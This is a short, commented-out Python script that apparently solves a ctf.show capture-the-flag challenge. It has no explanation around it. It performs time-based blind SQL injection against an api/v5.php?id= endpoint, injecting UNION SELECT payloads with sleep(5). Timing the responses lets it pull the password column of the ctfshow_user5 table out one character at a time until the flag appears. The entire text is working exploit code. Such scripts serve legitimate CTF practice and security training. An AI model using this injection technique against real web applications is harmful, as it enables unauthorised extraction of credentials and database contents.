# import requests
# import datetime
# from urllib.parse import quote
#
# url="http://2fe9336c-01de-4f8b-924d-75fc96a57172.challenge.ctf.show/api/v5.php?id="
# payload="0' union select  'a',if(ascii(substr(password,1,1))=99,'b','c') from ctfshow_user4 where id<1 or id>24--+"
# ans=""
# for index in range(1,129):
#     for ascc in range(1,128):
#         payload="0' union select  'a',if(ascii(substr(password,"+str(index)+",1))="+str(ascc)+",sleep(5),sleep(0)) from ctfshow_user5 where id<1 or id>24--+"
#         u=url+payload
#         print(u)
#         stratTime=datetime.datetime.now()
#         res=requests.get(u)
#         endtime=datetime.datetime.now()
#         sec = (endtime - stratTime).seconds
#         if sec>3:
#             ans=ans+chr(ascc)
#             print(ans)
#             if '}' in ans:
#                 exit(0)
#             break

